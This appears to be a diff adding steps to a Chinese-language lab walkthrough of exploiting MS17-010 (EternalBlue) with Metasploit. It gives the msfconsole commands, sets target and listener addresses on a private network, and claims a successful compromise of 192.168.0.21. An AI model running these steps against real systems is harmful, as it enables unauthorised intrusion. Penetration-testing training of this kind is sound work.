@@ -38,3 +38,22 @@ Initial Access - Exploit MS17_010
 
     msfconsole -q 執行metasploit
     search ms17_010
+
+<img alt="image" src="https://github.com/user-attachments/assets/6ad42976-a471-4f71-b7b2-4964d0f2f2f7">
+
+    use 2
+<img  alt="image" src="https://github.com/user-attachments/assets/46192082-9fcc-437f-bdfe-37eeb45a7ca2">
+
+    show options
+
+<img  alt="image" src="https://github.com/user-attachments/assets/9b8530f0-dfb7-4b49-9a34-1ee8a7d78329">
+
+    set rhost 192.168.0.21
+    set lhost 192.168.0.18
+    run
+<img  alt="image" src="https://github.com/user-attachments/assets/cc831b10-7387-4047-a2bd-33993b9dd238">
+
+    成功打進去192.168.0.21
+<img  alt="image" src="https://github.com/user-attachments/assets/d5bb80d8-953f-4724-a11a-a64047a7b9d9">
+
+
